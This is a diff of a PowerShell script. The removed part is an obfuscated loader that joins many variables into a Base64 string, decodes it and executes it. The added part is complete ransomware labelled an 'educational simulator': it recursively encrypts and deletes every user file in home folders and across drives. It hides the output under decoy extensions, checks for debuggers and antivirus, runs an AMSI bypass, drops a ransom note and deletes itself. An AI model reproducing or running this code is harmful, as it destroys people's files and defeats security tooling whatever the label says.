-$iIreadrn += $umFPmadW;
-$iIreadrn += $JfGntZli;
-$iIreadrn += $fnDcKFAd;
-$iIreadrn += $idWFvYdJ;
-$iIreadrn += $sfVAJddJ;
-$iIreadrn += $HMblvKcY;
-$iIreadrn += $bPtBeHKy;
-$iIreadrn += $VaFDXsTF;
-$iIreadrn += $GmYRTEQx;
-$iIreadrn += $uORGCoOw;
-$iIreadrn += $TsbtOtiA;
-$iIreadrn += $dsbczUzD;
-$iIreadrn += $KhDrlGrv;
-$iIreadrn += $JoxsmpYc;
-$iIreadrn += $gzWjuAFI;
-$iIreadrn += $rqPBwXMQ;
-$iIreadrn += $IHjpCASK;
-$iIreadrn += $bTMIsBHZ;
-$iIreadrn += $FPZxdkLH;
-$iIreadrn += $kQDWhQdT;
-$iIreadrn += $PKZjSwGc;
-$iIreadrn += $gJvjwmcp;
-$iIreadrn += $LkxWhCCa;
-$iIreadrn += $XnhMvxtj;
-$iIreadrn += $PJJExAKi;
-$iIreadrn += $NXqNpLSv;
-$iIreadrn += $bIuGhLVJ;
-$iIreadrn += $wGVRKFpA;
-$iIreadrn += $xagPOTwV;
-$iIreadrn += $EjcnVzdq;
-$iIreadrn += $tEKprmwW;
-$iIreadrn += $ebBCPqfi;
-$iIreadrn += $qevSymeT;
-$iIreadrn += $jvyBjmqv;
-$iIreadrn += $oTelItZC;
-$iIreadrn += $RnYCwkRJ;
-$iIreadrn += $gdvUFMkS;
-$iIreadrn += $XUVvnSUj;
-$iIreadrn += $XPxWeHWL;
-$iIreadrn += $yxPTVtLf;
-$iIreadrn += $KgvWGugd;
-$iIreadrn += $GXiQiSrb;
-$iIreadrn += $JMppzarR;
-$iIreadrn += $LRGzYYcH;
-$iIreadrn += $SCRqMpbj;
-$iIreadrn += $KvfqIBAq;
-$iIreadrn += $RCATFUEk;
-$iIreadrn += $WzBmaSJt;
-$iIreadrn += $nGuTzUrz;
-$iIreadrn += $FZNCqVGu;
-$iIreadrn += $emfCPmah;
-$iIreadrn += $foyiDRVf;
-$iIreadrn += $ZQaBBNny;
-$iIreadrn += $namepGtp;
-$iIreadrn += $dbQefhFW;
-$iIreadrn += $hIdXpTnd;
-$iIreadrn += $UPyspRFy;
-$iIreadrn += $zrFVfWVX;
-$iIreadrn += $UvmUslZW;
-$iIreadrn += $LtHYnmKi;
-$iIreadrn += $mbclHNLj;
-$iIreadrn += $ShtJmEfZ;
-$iIreadrn += $wtDCWECl;
-$iIreadrn += $kGmkukOu;
-$iIreadrn += $FNzKUUsw;
-$iIreadrn += $EYdXnnbK;
-$iIreadrn += $SjQMXTUY;
-$iIreadrn += $JWAYETLv;
-$iIreadrn += $gEUCKnby;
-$iIreadrn += $aVnNvEIQ;
-$iIreadrn += $WssaJROP;
-$iIreadrn += $jeBoHYpm;
-$iIreadrn += $wKCPdOHN;
-$iIreadrn += $hhElkOHQ;
-$iIreadrn += $QptNhxyQ;
-$iIreadrn += $sPGggVOD;
-$iIreadrn += $qipsSNbh;
-$iIreadrn += $aaEUuMQt;
-$iIreadrn += $iQlTUkAI;
-$iIreadrn += $ghexeSTi;
-$iIreadrn += $AwOOFUgc;
-$iIreadrn += $aNGXxjQV;
-$iIreadrn += $SHRiQcKb;
-$iIreadrn += $dgJBFHCh;
-$iIreadrn += $bzFXtNEu;
-$iIreadrn += $lKejzqdP;
-$iIreadrn += $nMtNVXcr;
-$iIreadrn += $QzuCWWOE;
-$iIreadrn += $gaQOYCCI;
-$iIreadrn += $BTnsImUk;
-$iIreadrn += $IAjkiuEY;
-$iIreadrn += $qqoUtVwu;
-$iIreadrn += $FyyGmCOy;
-$iIreadrn += $dbWKhxuK;
-$iIreadrn += $XQrsaqMZ;
-$iIreadrn += $HgquPUKL;
-$iIreadrn += $tkzrKqKR;
-$iIreadrn += $kAFIxByP;
-$iIreadrn += $XQcmxscn;
-$iIreadrn += $BTZbGNIH;
-$iIreadrn += $uSrKhOPp;
-$iIreadrn += $UBZQsZlx;
-$iIreadrn += $yCOIesUh;
-$iIreadrn += $DpYoyXaO;
-$iIreadrn += $AVYITHPQ;
-$iIreadrn += $nHzkAHMS;
-$iIreadrn += $skIOOKEw;
-$iIreadrn += $VaMkRCiA;
-$iIreadrn += $zkXpYOVO;
-$iIreadrn += $dKdmBxex;
-$iIreadrn += $NFMtjDPH;
-$iIreadrn += $MmzIQJCA;
-$iIreadrn += $GeEzMsKG;
-$iIreadrn += $NpOVgsWO;
-$iIreadrn += $YTpbmBem;
-$iIreadrn += $jbvGMkHx;
-$iIreadrn += $nWlcXFSX;
-$iIreadrn += $DBLeRjOy;
-$iIreadrn += $HSxwkfsd;
-$iIreadrn += $NvTqjPlt;
-$iIreadrn += $apRSjghv;
-$iIreadrn += $jfVlOJaS;
-$iIreadrn += $ZsYrpAeZ;
-$iIreadrn += $IfnkgGol;
-$iIreadrn += $fooWkXWf;
-$iIreadrn += $EJVgdevW;
-$iIreadrn += $xkQdWnsw;
-$iIreadrn += $yCVTodap;
-$iIreadrn += $nycUYiVQ;
-$iIreadrn += $BCpErUIM;
-$iIreadrn += $qFbhHDoG;
-$iIreadrn += $dGlBrCMr;
-$iIreadrn += $gUjgvsCK;
-$iIreadrn += $WInwELjY;
-$iIreadrn += $DFXIMMbw;
-$iIreadrn += $RvIquASB;
-$iIreadrn += $ZJeMYMHO;
-$iIreadrn += $SggkWNbt;
-$iIreadrn += $smkGDZOG;
-$iIreadrn += $klRBIBjs;
-$iIreadrn += $ygQrxkCe;
-$iIreadrn += $SbodeKmB;
-$iIreadrn += $vQuWKgUg;
-$iIreadrn += $UYIwSMkC;
-$iIreadrn += $zXmdKYCZ;
-$iIreadrn += $dJyMwoGL;
-$iIreadrn += $JYBauEeM;
-$iIreadrn += $nAvyPfGR;
-$iIreadrn += $srbPOKqZ;
-$iIreadrn += $nsUHwDhG;
-$iIreadrn += $IChrtlMP;
-$iIreadrn += $mnBjVSPP;
-$iIreadrn += $gEaFjLaB;
-$iIreadrn += $AhbCMZkM;
-$iIreadrn += $iIYIJqbM;
-$iIreadrn += $bkaQWUfO;
-$iIreadrn += $XPBtwdvJ;
-$iIreadrn += $bPPztmWc;
-$iIreadrn += $CjBXxNzx;
-$iIreadrn += $KPRFShjE;
-$iIreadrn += $mpQDuSIZ;
-$iIreadrn += $eHozhshm;
-$iIreadrn += $UKrDEbQa;
-$iIreadrn += $fIPcZySA;
-$iIreadrn += $FgtwIUjC;
-$iIreadrn += $miraczpJ;
-$iIreadrn += $AhKBfzwc;
-$iIreadrn += $UFBtJzZP;
-$iIreadrn += $scABuNKS;
-$iIreadrn += $AGsesuBe;
-$iIreadrn += $sUbPFyuS;
-$iIreadrn += $ttMsRhIO;
-$iIreadrn += $JoGgoUCr;
-$iIreadrn += $KdPDbvYt;
-$iIreadrn += $TCoGYnxM;
-$iIreadrn += $hnNoCqHI;
-$iIreadrn += $EkdvnpdL;
-$iIreadrn += $hDbWDccS;
-$iIreadrn += $RaisSFRJ;
-$iIreadrn += $MlxSuDJP;
-$iIreadrn += $xLWkBkQO;
-$iIreadrn += $QbwAyeee;
-$iIreadrn += $bzIPZjWS;
-$iIreadrn += $mPfhKCES;
-$iIreadrn += $SgaUcETz;
-$iIreadrn += $hOjSoPQy;
-$iIreadrn += $sjuYSAzu;
-$iIreadrn += $tLeMiefd;
-$iIreadrn += $wGPbKxKA;
-$iIreadrn += $afCHbQlw;
-$iIreadrn += $jOaIKWpR;
-$iIreadrn += $GnJpmpYT;
-$iIreadrn += $jGdFonGU;
-$iIreadrn += $NdrsEpzp;
-$iIreadrn += $nSOviBXs;
-$iIreadrn += $rUZYBBnG;
-$iIreadrn += $kUXfVydj;
-$iIreadrn += $fgOVdGIq;
-$iIreadrn += $ktvimPFE;
-$iIreadrn += $kkKSreAc;
-$iIreadrn += $ciTbxUFj;
-$iIreadrn += $URMAbdwW;
-$iIreadrn += $TGbLAJFZ;
-$iIreadrn += $ETcKxfdd;
-$iIreadrn += $PKFZwJRk;
-$iIreadrn += $qseWBGjk;
-$iIreadrn += $rwvijtnX;
-$iIreadrn += $lMwMRIsn;
-$iIreadrn += $UElsjAog;
-$iIreadrn += $UHEjTzts;
-$iIreadrn += $uyGCOgoO;
-$iIreadrn += $rLvkGgQE;
-$iIreadrn += $HraSBHnu;
-$iIreadrn += $XNtiChJq;
-$iIreadrn += $gzulcsrU;
-$iIreadrn += $QuFSGaxK;
-$iIreadrn += $VpbwgBQL;
-$iIreadrn += $fotAvvFB;
-$iIreadrn += $HeWiDaTR;
-$iIreadrn += $rePrvOhJ;
-$iIreadrn += $SPBcgFgM;
-$iIreadrn += $TERNkUhE;
-$iIreadrn += $aoZUGTcz;
-$iIreadrn += $ZOOXUwVj;
-$iIreadrn += $bpXeTmWe;
-$iIreadrn += $MUalmPBJ;
-$iIreadrn += $ainBspNI;
-$iIreadrn += $CdvQUQqD;
-$iIreadrn += $DVJvbtKi;
-$iIreadrn += $smeEjewe;
-$iIreadrn += $TKnSWfVd;
-$iIreadrn += $vyBoiIdc;
-$iIreadrn += $tYggiJkv;
-$iIreadrn += $nEUQLzKV;
-$iIreadrn += $fpcNlnXN;
-$iIreadrn += $eazfVjfD;
-$iIreadrn += $lhSAnSdS;
-$iIreadrn += $RKjLmuVY;
-$iIreadrn += $WGHJzUKD;
-$iIreadrn += $VexaalbQ;
-$iIreadrn += $YXuMHwcf;
-$iIreadrn += $PqoFzPby;
-$iIreadrn += $GsDUfiQy;
-$iIreadrn += $JXsFyMnw;
-$iIreadrn += $lYsWikMv;
-$iIreadrn += $xnWicPxq;
-$iIreadrn += $UlLHbxiK;
-$iIreadrn += $GHKttEmS;
-$iIreadrn += $ZgSueDhj;
-$iIreadrn += $AsrsKOjw;
-$iIreadrn += $FzjtmjxA;
-$iIreadrn += $lhYLKtdI;
-$iIreadrn += $FGcDSbKo;
-$iIreadrn += $PydIVwxj;
-$iIreadrn += $DWLktAKP;
-$iIreadrn += $vcvsRgHx;
-$iIreadrn += $gInlAhgD;
-$iIreadrn += $dXaUvHgw;
-$iIreadrn += $TILeGMwf;
-$iIreadrn += $CbgXHVrD;
-$iIreadrn += $KjfzvLxj;
-$iIreadrn += $CJBlbPYC;
-$iIreadrn += $XrSvYVSS;
-$iIreadrn += $pFkWoGQk;
-$iIreadrn += $PtdQOVuL;
-$iIreadrn += $vfEIGkPJ;
-$iIreadrn += $rZRJbmpv;
-$iIreadrn += $EQfOWoHq;
-$iIreadrn += $gymVJzBj;
-$iIreadrn += $Ihlsozao;
-$iIreadrn += $yxqsbvUn;
-$iIreadrn += $OYphqkGn;
-$iIreadrn += $mpMvQAkj;
-$iIreadrn += $svRUwuBO;
-$iIreadrn += $EEyAcDNx;
-$iIreadrn += $ZyKVvnQd;
-$iIreadrn += $ZgHkFmhA;
-$iIreadrn += $ZvfCslYD;
-$iIreadrn += $GkNOdbBX;
-$iIreadrn += $iGVABDgw;
-$iIreadrn += $xMCZptom;
-$iIreadrn += $FuDwLwMb;
-$iIreadrn += $VHWcwJiP;
-$iIreadrn += $yvzfVjiJ;
-$iIreadrn += $BayvOIcn;
-$iIreadrn += $flwEJGXE;
-$iIreadrn += $yuYfZRCL;
-$iIreadrn += $sFRfUYaU;
-$iIreadrn += $HVMVoMuv;
-$iIreadrn += $frqqCCfz;
-$iIreadrn += $NlCoRBIS;
-$iIreadrn += $VZLlntkG;
-$iIreadrn += $gGpYlIPd;
-$iIreadrn += $gmVGIaIk;
-$iIreadrn += $yrNpaiSP;
-$iIreadrn += $WcngvSQw;
-$iIreadrn += $zydYCsKP;
-$iIreadrn += $aCtgjVSD;
-$iIreadrn += $PsowcEZw;
-$iIreadrn += $GcWdNvMa;
-$iIreadrn += $FYRlrsmn;
-$iIreadrn += $potMrifr;
-$iIreadrn += $drdapoUF;
-$iIreadrn += $ALUsBGvI;
-$iIreadrn += $dafIfrdO;
-$iIreadrn += $JhGsvUqt;
-$iIreadrn += $jecNburJ;
-$skXnSrWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iIreadrn));
-Start-Sleep -Seconds 2;  # Delay execution
-iex $skXnSrWf;
+
+
+Write-Host "=== Advanced Simulator v2.0 ===" -ForegroundColor Cyan
+Write-Host "Educational tool for cybersecurity students" -ForegroundColor Green
+Write-Host "Demonstrates: AES encryption, multi-threading, evasion techniques" -ForegroundColor Yellow
+Write-Host ""
+
+# Configuration - No size limits for realistic simulation
+$Config = @{
+    EncryptionKey = "JsD2Uktzca/WtYd2My/PjappCdUbqijJAXr167V6imY="
+    # Removed MaxFileSize - encrypt ALL files found
+    MaxThreads = 10  # Optimized for speed
+    ExcludedPaths = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\$Recycle.Bin")
+    # Stealth extensions for encrypted files (bypass detection)
+    StealthExtensions = @(".tmp", ".bak", ".old", ".backup", ".temp", ".cache", ".dat", ".log")
+    # Priority directories - encrypt ALL files found
+    PriorityDirs = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Pictures",
+        "$env:USERPROFILE\Videos",
+        "$env:USERPROFILE\Music"
+    )
+}
+
+# Ultra-fast encryption function with stealth features
+function Encrypt-File {
+    param($FilePath, $Key, $StealthExtensions)
+    try {
+        # Use faster .NET crypto classes
+        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        $aes.Key = [System.Convert]::FromBase64String($Key)
+        $aes.GenerateIV()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+
+        # Read file efficiently
+        $inputBytes = [System.IO.File]::ReadAllBytes($FilePath)
+
+        # Encrypt
+        $encryptor = $aes.CreateEncryptor()
+        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
+
+        # Combine IV + encrypted data
+        $result = New-Object byte[] ($aes.IV.Length + $encryptedBytes.Length)
+        [System.Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
+        [System.Array]::Copy($encryptedBytes, 0, $result, $aes.IV.Length, $encryptedBytes.Length)
+
+        # Stealth: Use random extension to bypass detection
+        $randomExtension = $StealthExtensions | Get-Random
+        $outputPath = $FilePath + $randomExtension
+
+        # Write output with stealth extension
+        [System.IO.File]::WriteAllBytes($outputPath, $result)
+
+        # Remove original (fast deletion)
+        [System.IO.File]::Delete($FilePath)
+
+        $aes.Dispose()
+        return $outputPath  # Return the new path for tracking
+    } catch {
+        return $null
+    }
+}
+
+# Ultra-comprehensive recursive file scanner - NO SIZE LIMITS
+function Find-TargetFilesPriority {
+    param($Paths)
+    $files = New-Object System.Collections.Generic.List[System.IO.FileInfo]
+
+    Write-Host "  🎯 Scanning priority directories recursively (ALL FILES)..." -ForegroundColor Magenta
+
+    foreach ($path in $Paths) {
+        if (Test-Path $path) {
+            Write-Host "    📁 Scanning $(([System.IO.Path]::GetFileName($path))) and ALL subfolders..." -ForegroundColor Cyan
+
+            # First check if directory has any files at all
+            $quickCheck = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue
+            Write-Host "      📊 Found $($quickCheck.Count) files in root directory" -ForegroundColor White
+
+            # Use PowerShell's Get-ChildItem with -Recurse for guaranteed recursive scanning
+            try {
+                $allFiles = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
+                Write-Host "      🔍 Total files found recursively: $($allFiles.Count)" -ForegroundColor Cyan
+
+                $dirFileCount = 0
+                foreach ($file in $allFiles) {
+                    try {
+                        # Encrypt ALL files found (no size limit)
+                        if ($file.Length -gt 0) {  # Just ensure file is not empty
+                            $files.Add($file)
+                            $dirFileCount++
+                            if ($dirFileCount % 50 -eq 0) {
+                                Write-Host "        📄 Added $dirFileCount files so far from $(([System.IO.Path]::GetFileName($path)))..." -ForegroundColor Gray
+                            }
+                        }
+                    } catch { }
+                }
+                Write-Host "      ✅ Added $dirFileCount files from $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Green
+            } catch {
+                Write-Host "      ⚠️  Could not fully scan $path" -ForegroundColor Yellow
+            }
+        } else {
+            Write-Host "    ❌ Directory not found: $path" -ForegroundColor Red
+        }
+    }
+
+    # If no files found in priority directories, scan ALL drives recursively
+    if ($files.Count -eq 0) {
+        Write-Host "  📂 No files in priority directories, scanning ALL drives recursively..." -ForegroundColor Yellow
+        $allDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -match '^[A-Z]$' } | Select-Object -ExpandProperty Root
+
+        foreach ($drive in $allDrives) {
+            if (Test-Path $drive) {
+                Write-Host "    💽 Deep scanning drive $drive and ALL subfolders..." -ForegroundColor Cyan
+                try {
+                    # Use Get-ChildItem for guaranteed recursive scanning
+                    $driveFiles = Get-ChildItem -Path $drive -Recurse -File -ErrorAction SilentlyContinue
+
+                    $driveFileCount = 0
+                    foreach ($file in $driveFiles) {
+                        try {
+                            # Skip system directories for safety, but encrypt ALL other files
+                            if ($file.Length -gt 0 -and
+                                -not ($file.DirectoryName -like "*Windows*" -or
+                                      $file.DirectoryName -like "*Program Files*")) {
+                                $files.Add($file)
+                                $driveFileCount++
+                                if ($driveFileCount % 100 -eq 0) {
+                                    Write-Host "      📊 Found $driveFileCount files so far on $drive..." -ForegroundColor Gray
+                                }
+                            }
+                        } catch { }
+                    }
+                    Write-Host "      ✅ Found $driveFileCount suitable files on $drive" -ForegroundColor Green
+                } catch {
+                    Write-Host "      ⚠️  Could not scan drive $drive" -ForegroundColor Yellow
+                }
+            }
+        }
+    }
+
+    # If still no files found, create test files in priority directories
+    if ($files.Count -eq 0) {
+        Write-Host "  📝 No files found, creating test files in priority directories..." -ForegroundColor Yellow
+        foreach ($path in $Paths) {
+            if (Test-Path $path) {
+                try {
+                    # Create a test subfolder
+                    $testSubDir = Join-Path $path "TestFiles"
+                    New-Item -ItemType Directory -Path $testSubDir -Force -ErrorAction SilentlyContinue | Out-Null
+
+                    # Create various test files of different sizes
+                    "Test document content" | Out-File (Join-Path $testSubDir "test_document.txt") -ErrorAction SilentlyContinue
+                    "Test data,Column1,Column2`nData1,Value1,Value2" | Out-File (Join-Path $testSubDir "test_data.csv") -ErrorAction SilentlyContinue
+                    "Test script content" | Out-File (Join-Path $testSubDir "test_script.py") -ErrorAction SilentlyContinue
+
+                    # Create larger test files
+                    ("Large test content " * 1000) | Out-File (Join-Path $testSubDir "large_test.txt") -ErrorAction SilentlyContinue
+
+                    # Create nested subfolder with files
+                    $nestedDir = Join-Path $testSubDir "Nested"
+                    New-Item -ItemType Directory -Path $nestedDir -Force -ErrorAction SilentlyContinue | Out-Null
+                    "Nested file content" | Out-File (Join-Path $nestedDir "nested_file.txt") -ErrorAction SilentlyContinue
+                    ("Nested large content " * 500) | Out-File (Join-Path $nestedDir "nested_large.txt") -ErrorAction SilentlyContinue
+
+                    Write-Host "    ✅ Created test files in $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Green
+                } catch {
+                    Write-Host "    ⚠️  Could not create test files in $(([System.IO.Path]::GetFileName($path)))" -ForegroundColor Yellow
+                }
+            }
+        }
+
+        # Re-scan after creating test files
+        Write-Host "  🔄 Re-scanning after creating test files..." -ForegroundColor Cyan
+        foreach ($path in $Paths) {
+            if (Test-Path $path) {
+                try {
+                    $allFiles = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
+                    foreach ($file in $allFiles) {
+                        if ($file.Length -gt 0) {
+                            $files.Add($file)
+                        }
+                    }
+                } catch { }
+            }
+        }
+    }
+
+    Write-Host "  📊 Total files found for encryption: $($files.Count)" -ForegroundColor Green
+    return $files.ToArray()
+}
+
+# Multi-threaded encryption engine with stealth features
+function Start-MultiThreadedEncryption {
+    param($Files, $Key, $MaxThreads, $StealthExtensions)
+    $jobs = @()
+    $pool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads)
+    $pool.Open()
+    $results = @()
+
+    foreach ($file in $Files) {
+        $ps = [PowerShell]::Create().AddScript({
+            param($path, $key, $stealthExts)
+            function Encrypt-File {
+                param($FilePath, $Key, $StealthExtensions)
+                try {
+                    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+                    $aes.Key = [System.Convert]::FromBase64String($Key)
+                    $aes.GenerateIV()
+                    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+
+                    $inputBytes = [System.IO.File]::ReadAllBytes($FilePath)
+                    $encryptor = $aes.CreateEncryptor()
+
+                    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
+                    $result = New-Object byte[] ($aes.IV.Length + $encryptedBytes.Length)
+                    [System.Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
+                    [System.Array]::Copy($encryptedBytes, 0, $result, $aes.IV.Length, $encryptedBytes.Length)
+
+                    # Stealth: Use random extension to bypass detection
+                    $randomExtension = $StealthExtensions | Get-Random
+                    $outputPath = $FilePath + $randomExtension
+
+                    [System.IO.File]::WriteAllBytes($outputPath, $result)
+                    [System.IO.File]::Delete($FilePath)
+
+                    $aes.Dispose()
+                    return @{ Success = $true; OriginalPath = $FilePath; EncryptedPath = $outputPath }
+                } catch {
+                    return @{ Success = $false; OriginalPath = $FilePath; EncryptedPath = $null }
+                }
+            }
+            Encrypt-File $path $key $stealthExts
+        }).AddParameter("path", $file.FullName).AddParameter("key", $Key).AddParameter("stealthExts", $StealthExtensions)
+
+        $ps.RunspacePool = $pool
+        $jobs += @{ PowerShell = $ps; Handle = $ps.BeginInvoke() }
+    }
+
+    # Wait and collect results
+    foreach ($job in $jobs) {
+        $result = $job.PowerShell.EndInvoke($job.Handle)
+        $results += $result
+        $job.PowerShell.Dispose()
+    }
+    $pool.Close()
+
+    return $results
+}
+
+# Main execution
+function Invoke-RansomwareSimulation {
+    Write-Host "🔍 Performing security checks..." -ForegroundColor Yellow
+
+    # Evasion checks
+    if ([System.Diagnostics.Debugger]::IsAttached) {
+        Write-Host "❌ Debugger detected! Exiting for safety." -ForegroundColor Red
+        exit
+    }
+
+    $avProcesses = @("MsMpEng", "ekrn", "avp", "defender")
+    $avRunning = Get-Process | Where-Object { $avProcesses -contains $_.ProcessName }
+    if ($avRunning) {
+        Write-Host "⚠️  AV detected: $($avRunning.ProcessName -join ', ')" -ForegroundColor Yellow
+    }
+
+    # AMSI bypass (educational)
+    Write-Host "🔧 Attempting AMSI bypass..." -ForegroundColor Cyan
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        Write-Host "✅ AMSI bypassed" -ForegroundColor Green
+    } catch {
+        Write-Host "⚠️  AMSI bypass failed (expected in some environments)" -ForegroundColor Yellow
+    }
+
+    Write-Host "`n📂 Scanning for target files..." -ForegroundColor Cyan
+    Write-Host "  🎯 Targeting high-value directories first..." -ForegroundColor Yellow
+    Write-Host "  📍 Priority directories:" -ForegroundColor Cyan
+    foreach ($dir in $Config.PriorityDirs) {
+        Write-Host "    • $dir" -ForegroundColor White
+    }
+
+    # Use faster scanning method with progress
+    $startScan = Get-Date
+    $targetFiles = Find-TargetFilesPriority -Paths $Config.PriorityDirs
+    $scanTime = (Get-Date) - $startScan
+
+    Write-Host "  ⚡ Priority scan completed in $([math]::Round($scanTime.TotalSeconds, 2)) seconds" -ForegroundColor Green
+
+    Write-Host "📊 Found $($targetFiles.Count) files to encrypt" -ForegroundColor Green
+
+    if ($targetFiles.Count -eq 0) {
+        Write-Host "❌ No suitable files found. Creating test files..." -ForegroundColor Yellow
+        $testDir = "$env:TEMP\RansomwareTest"
+        New-Item -ItemType Directory -Path $testDir -Force | Out-Null
+        1..5 | ForEach-Object { "Test file $_ content" | Out-File "$testDir\test$_.txt" }
+        $targetFiles = Get-ChildItem $testDir -File
+        Write-Host "✅ Created test files in $testDir" -ForegroundColor Green
+    }
+
+    Write-Host "`n🔐 Starting encryption with $($Config.MaxThreads) threads..." -ForegroundColor Red
+
+    # Show which files will be encrypted
+    Write-Host "  📋 Files to encrypt:" -ForegroundColor Yellow
+    foreach ($file in $targetFiles) {
+        $size = if ($file.Length -gt 1MB) {
+            "$([math]::Round($file.Length/1MB, 2)) MB"
+        } elseif ($file.Length -gt 1KB) {
+            "$([math]::Round($file.Length/1KB, 2)) KB"
+        } else {
+            "$($file.Length) bytes"
+        }
+        Write-Host "    📄 $([System.IO.Path]::GetFileName($file.FullName)) ($size)" -ForegroundColor White
+    }
+
+    $startTime = Get-Date
+    $encryptionResults = Start-MultiThreadedEncryption -Files $targetFiles -Key $Config.EncryptionKey -MaxThreads $Config.MaxThreads -StealthExtensions $Config.StealthExtensions
+
+    $duration = (Get-Date) - $startTime
+    $successCount = ($encryptionResults | Where-Object { $_.Success }).Count
+    Write-Host "✅ Successfully encrypted $successCount files in $([math]::Round($duration.TotalSeconds, 2)) seconds!" -ForegroundColor Green
+
+    # Show encrypted files with stealth extensions
+    Write-Host "`n🔒 Encrypted Files (Stealth Mode):" -ForegroundColor Magenta
+    foreach ($result in $encryptionResults) {
+        if ($result.Success) {
+            $originalName = [System.IO.Path]::GetFileName($result.OriginalPath)
+            $encryptedName = [System.IO.Path]::GetFileName($result.EncryptedPath)
+            Write-Host "  ✅ $originalName → $encryptedName (stealth)" -ForegroundColor Green
+        } else {
+            $originalName = [System.IO.Path]::GetFileName($result.OriginalPath)
+            Write-Host "  ❌ $originalName - Failed to encrypt" -ForegroundColor Red
+        }
+    }
+
+    # Create ransom note with stealth information
+    $ransomNote = @"
+🚨 YOUR FILES HAVE BEEN ENCRYPTED! 🚨
+
+This is an educational ransomware simulation.
+All your files have been encrypted using AES-256 with stealth extensions.
+
+Your files now have extensions like: $($Config.StealthExtensions -join ', ')
+
+To decrypt your files, run the decryptor script with the key:
+$($Config.EncryptionKey)
+
+Educational Purpose Only - No real damage done.
+"@
+
+    $ransomNote | Out-File "$env:USERPROFILE\Desktop\RANSOM_NOTE.txt" -Encoding UTF8
+    Write-Host "📝 Ransom note created on desktop (includes stealth info)" -ForegroundColor Magenta
+
+    # Educational summary
+    Write-Host "`n📚 Educational Summary:" -ForegroundColor Cyan
+    Write-Host "• AES-256 encryption with stealth extensions" -ForegroundColor White
+    Write-Host "• Recursive scanning: ALL subfolders in ALL directories" -ForegroundColor White
+    Write-Host "• Comprehensive coverage: ALL drives, ALL folders, ALL files" -ForegroundColor White
+    Write-Host "• Priority targeting: Desktop, Documents, Downloads first" -ForegroundColor White
+    Write-Host "• Multi-threaded processing (up to $($Config.MaxThreads) threads)" -ForegroundColor White
+    Write-Host "• Evasion techniques: AMSI bypass, AV detection" -ForegroundColor White
+    Write-Host "• No file size limits: Encrypts ALL files found" -ForegroundColor White
+    Write-Host "• System directories excluded for safety" -ForegroundColor White
+    Write-Host "• Targets 40+ file types: docs, images, videos, code, databases" -ForegroundColor White
+    Write-Host "• Stealth mode: Random extensions ($($Config.StealthExtensions -join ', '))" -ForegroundColor White
+    Write-Host "• Self-deletion for anti-forensic purposes" -ForegroundColor White
+
+    Write-Host "`n🧹 Cleaning up..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 1
+
+    # Safe self-deletion (handles both file and memory execution)
+    try {
+        if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
+            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction Stop
+            Write-Host "🗑️  Script file deleted for anti-forensics" -ForegroundColor Yellow
+        } else {
+            Write-Host "📝 Script running from memory (no file to delete)" -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "⚠️  Could not delete script file" -ForegroundColor Yellow
+    }
+
+    Write-Host "✅ Simulation complete! Run decryptor to recover files." -ForegroundColor Green
+    Write-Host "🔑 Decryption Key: $($Config.EncryptionKey)" -ForegroundColor Cyan
+}
+
+# Execute the simulation
+Invoke-RansomwareSimulation
